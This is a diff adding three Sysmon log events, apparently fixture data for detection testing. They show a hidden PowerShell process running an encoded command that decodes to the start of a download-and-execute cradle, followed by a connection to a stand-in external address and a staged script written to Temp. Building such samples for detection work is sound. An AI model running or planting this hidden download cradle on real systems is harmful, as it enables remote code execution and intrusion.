@@ -1,0 +1,3 @@
+2026-07-13T09:04:11Z WIN-SERVER-01 Microsoft-Windows-Sysmon EventID=1 User=ACME\alice Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine="powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" ParentImage=C:\Windows\explorer.exe
+2026-07-13T09:04:19Z WIN-SERVER-01 Microsoft-Windows-Sysmon EventID=3 User=ACME\alice Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=203.0.113.200 DestinationPort=443 Protocol=tcp
+2026-07-13T09:05:02Z WIN-SERVER-01 Microsoft-Windows-Sysmon EventID=11 User=ACME\alice TargetFilename=C:\Users\alice\AppData\Local\Temp\stage.ps1 Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
